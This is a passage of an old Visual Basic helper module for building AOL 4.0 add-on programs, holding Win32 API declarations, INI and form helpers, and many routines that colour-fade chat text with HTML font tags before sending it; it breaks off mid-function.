Attribute VB_Name = "Ravage"
''  ¤—————————————=–=———————————————¤
'  |     RàVàGè`s ³² ßìt ßàs!      |
'  |      For Vì§ùà£ ßàŠì¢ 4 & 5   |
'  |           For AoL 4.o         |
'  ¤—————————————=–=———————————————¤
'
'     Sup all this is my Second bas
'  file it has 415 subs and functions
'    in it , Just about anything u
'   will ever need to make a great
'    prog. There are examples and
'   help in the bas on alot of the
' subs so it is easy for u to succed
'      in makin an awsome prog
'  some of the shit in my bas was
'  takin outta other  bas files and
'   they were givin credit for it
'  If u wanna use shit from my bas
'  to make your own make sure u do
'   the same for me ... If u need
'   any help with this bas or have
'   any ideas of stuff that can be
'         added e-mail me at
'
'         RaVaGeVbX@aol.com
'
'     Updated Currently By: Soap
'         www.come.to/aqua!
'
'    ¤¤¤¤¤ ¤¤¤¤¤   ¤   ¤¤¤¤  ¤¤¤¤
'    ¤ ¤ ¤ ¤      ¤ ¤  ¤     ¤
'    ¤¤¤¤¤ ¤¤¤¤¤  ¤¤¤  ¤     ¤¤¤¤
'    ¤     ¤      ¤ ¤  ¤     ¤
'    ¤     ¤¤¤¤¤  ¤ ¤  ¤¤¤¤  ¤¤¤¤¤
'_____________________________
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function MciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As Any, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_USER = &H400

Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const LB_GETITEMDATA = &H199
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188


Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7

Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const flags = SWP_NOMOVE Or SWP_NOSIZE
Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1

Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3

Public Const SW_HIDE = 0

Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1
Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type
Type POINTAPI
   X As Long
   Y As Long
End Type
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function ReleaseCapture Lib "user32" () As Long
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const HTCAPTION = 2
Global iniPath




Public Function GetFromINI(AppName$, KeyName$, FileName$) As String
Dim RetStr As String
RetStr = String(255, Chr(0))
GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), FileName$))
'To write to an ini type this
'R% = WritePrivateProfileString("ascii", "Color", "bbb", App.Path + "\RaVaGe.ini")

'To read do this
'Color$ = GetFromINI("ascii", "Color", App.Path + "\RaVaGe.ini")
'If Color$ = "bbb" Then

'*Note* an .ini must be in the the same foder as the prog with these examples
'For more info read the ini_Help.txt that was included with this
End Function

Public Function Random(Index As Integer)
Randomize
Result = Int((Index * Rnd) + 1)
Random = Result
'To usethis,  example
'Dim NumSel As Integer
'NumSel = Random(2)
'If NumSel = 1 Then

'The number in ( ) is the max num.
'With that example you will either get a 1 or 2
End Function
Public Sub MoveForm(frm As Form)
ReleaseCapture
X = SendMessage(frm.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)

'To use this,  put the following code in the "Mousedown"  dec
'of a label or picture box *Replace frm with your formname.
'MoveForm(frm)

End Sub

Sub BoldFadeBlack(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    d$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><I><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & U$ & "<FONT COLOR=#222222>" & s$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & L$ & "<FONT COLOR=#666666>" & F$ & "<FONT COLOR=#777777>" & b$ & "<FONT COLOR=#888888>" & C$ & "<FONT COLOR=#999999>" & d$ & "<FONT COLOR=#888888>" & H$ & "<FONT COLOR=#777777>" & J$ & "<FONT COLOR=#666666>" & k$ & "<FONT COLOR=#555555>" & M$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & Z$
Next W
SendChat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Sub BoldFadeGreen(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    d$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & U$ & "<FONT COLOR=#003300>" & s$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & L$ & "<FONT COLOR=#007700>" & F$ & "<FONT COLOR=#008800>" & b$ & "<FONT COLOR=#009900>" & C$ & "<FONT COLOR=#00FF00>" & d$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & J$ & "<FONT COLOR=#007700>" & k$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & Z$
Next W
SendChat (PC$)
End Sub
Function BoldFadeRed(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    d$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & U$ & "<FONT COLOR=#880000>" & s$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & L$ & "<FONT COLOR=#440000>" & F$ & "<FONT COLOR=#330000>" & b$ & "<FONT COLOR=#220000>" & C$ & "<FONT COLOR=#110000>" & d$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & J$ & "<FONT COLOR=#440000>" & k$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & Z$
Next W
BoldFadeRed = (PC$)


End Function
Function BoldFadeBlue(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    d$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & U$ & "<FONT COLOR=#00003F>" & s$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & L$ & "<FONT COLOR=#0000A5>" & F$ & "<FONT COLOR=#0000BE>" & b$ & "<FONT COLOR=#0000D7>" & C$ & "<FONT COLOR=#0000F1>" & d$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & J$ & "<FONT COLOR=#0000A5>" & k$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & Z$
Next W
BoldFadeBlue = (PC$)

End Function

Sub BoldFadeYellow(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    d$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & U$ & "<FONT COLOR=#888800>" & s$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & L$ & "<FONT COLOR=#444400>" & F$ & "<FONT COLOR=#333300>" & b$ & "<FONT COLOR=#222200>" & C$ & "<FONT COLOR=#111100>" & d$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & J$ & "<FONT COLOR=#444400>" & k$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & Z$
Next W
SendChat (PC$)

End Sub


Function BoldBlackBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)

End Function

Function BoldBlackGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlackGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 220 / a
        F = E * b
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlackPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldBlackRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldBlackRed = Msg
End Function

Function BoldBlackYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldBlueBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldBluePurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldBlueYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldGreenBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldGreenBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldGreenPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldGreenRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldGreenYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (Msg)
End Function

Function BoldGreyBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 220 / a
        F = E * b
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
SendChat (Msg)
End Function

Function BoldPurpleBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
